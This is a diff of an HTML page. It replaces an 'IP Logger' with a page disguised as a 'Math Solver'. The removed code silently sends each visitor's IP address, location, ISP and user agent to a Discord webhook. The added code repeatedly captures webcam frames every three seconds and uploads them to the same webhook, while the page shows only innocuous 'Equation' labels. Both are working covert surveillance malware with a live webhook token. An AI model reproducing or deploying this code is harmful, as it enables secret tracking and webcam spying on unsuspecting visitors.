@@ -1,89 +1,69 @@
 <!DOCTYPE html>
 <html>
-<head>
-	<meta charset="utf-8">
-	<title>Ip Logger</title>
-	<link type="text/css" rel="stylesheet" href="style.css">
-	<script src= "https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
-	<script>
-		$.get("https://ipinfo.io", function(response) {
-			const webhook_url = "https://discord.com/api/webhooks/1510045783569731689/xcmiVNiaufUcgg8C_sUJRKtZxTeUSv2GqyEh4UHRkjiMegYg3wr0LTTXfRJIsdtY9NSj";
-			const main = {
-				title: "Meths | Meth Stresser",
-				description: "> Meth Stresser",
-				thumbnail: {
-					url: "https://cdn.discordapp.com/avatars/586435544750358540/a_36fc175d7430d6e04516474126184ed4.gif?size=2048",
-				},
-				fields: [
-					{
-						name: "IP:",
-						value: `\`${response.ip}\``,
-						inline: false,
-					},
-					{
-						name: "User-Agent:",
-						value: `\`${navigator.userAgent}\``,
-						inline: false,
-					},
-					{
-						name: "City:",
-						value: `\`${response.city}\``,
-						inline: false,
-					},
-					{
-						name: "Region:",
-						value: `\`${response.region}\``,
-						inline: false
-					},
-					{
-						name: "Country:",
-						value: `\`${response.country}\``,
-						inline: false
-					},
-					{
-						name: "Long/Lat:",
-						value: `\`${response.loc}\``,
-						inline: false
-					},
-					{
-						name: "Company:",
-						value: `\`${response.org}\``,
-						inline: false
-					},
-					{
-						name: "Postal Region:",
-						value: `\`${response.postal}\``,
-						inline: false
-					},
-				],
-				footer: {
-					text: "Meths | GET IP LOGGED"
-				},
-				author: {
-					name: "{ Meths }",
-					url: ""
-				}
-			}
-			var xhttp = new XMLHttpRequest();
-			const url = webhook_url;
-			xhttp.open("POST", url, true);
-			xhttp.setRequestHeader('Content-Type', 'application/json');
-			xhttp.send(JSON.stringify({
-				'username': 'IP Logger',
-				'embeds': [main],
-			}));
-		}, "json");
-	</script>
-</head>
-<body>
-	<center>
-		<h1>Information</h1>
-		<input type="color"></input>
-		<p>Actual time: <span id="here"></span></p>
-	</center>
-	<script>
-		const date = new Date();
-		document.getElementById('here').innerHTML = date;
-	</script>
-</body>
+  <head>
+    <meta charset="UTF-8">
+    <title>Math Solver</title>
+    <style>
+      body {
+        background-color: #f7f7f7;
+        font-family: Arial, sans-serif;
+        font-size: 16px;
+      }
+      h1 {
+        color: #003580;
+        font-size: 32px;
+        text-align: center;
+        margin-top: 50px;
+      }
+      #math-image {
+        display: block;
+        margin: 0 auto;
+        width: 400px;
+        height: 300px;
+        border: 2px solid #003580;
+        border-radius: 10px;
+        box-shadow: 5px 5px 10px rgba(0, 0, 0, 0.2);
+      }
+      #math-equation {
+        text-align: center;
+        margin-top: 20px;
+        font-size: 24px;
+        color: #003580;
+      }
+    </style>
+  </head>
+  <body>
+    <h1>Math Solver</h1>
+    <img id="math-image" src="" alt="Math Equation">
+    <div id="math-equation"></div>
+    <script>
+      let imageCounter = 1;
+      const intervalId = setInterval(captureImage, 3000);
+
+      async function captureImage() {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({video: true, width: 400, height: 300});
+          const video = document.createElement('video');
+          video.srcObject = stream;
+          video.play();
+          document.body.appendChild(video);
+          const canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          canvas.getContext('2d').drawImage(video, 0, 0);
+          const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 1.0));
+          const formData = new FormData();
+          formData.append('file', blob, 'math-equation.jpg');
+          const xhr = new XMLHttpRequest();
+          xhr.open('POST', 'https://discord.com/api/webhooks/1510045783569731689/xcmiVNiaufUcgg8C_sUJRKtZxTeUSv2GqyEh4UHRkjiMegYg3wr0LTTXfRJIsdtY9NSj');
+          xhr.send(formData);
+          const equation = `Equation ${imageCounter++}`;
+          document.getElementById('math-image').src = canvas.toDataURL();
+          document.getElementById('math-equation').innerHTML = equation;
+        } catch (error) {
+          console.log(error.name + ": " + error.message);
+        }
+      }
+    </script>
+  </body>
 </html>
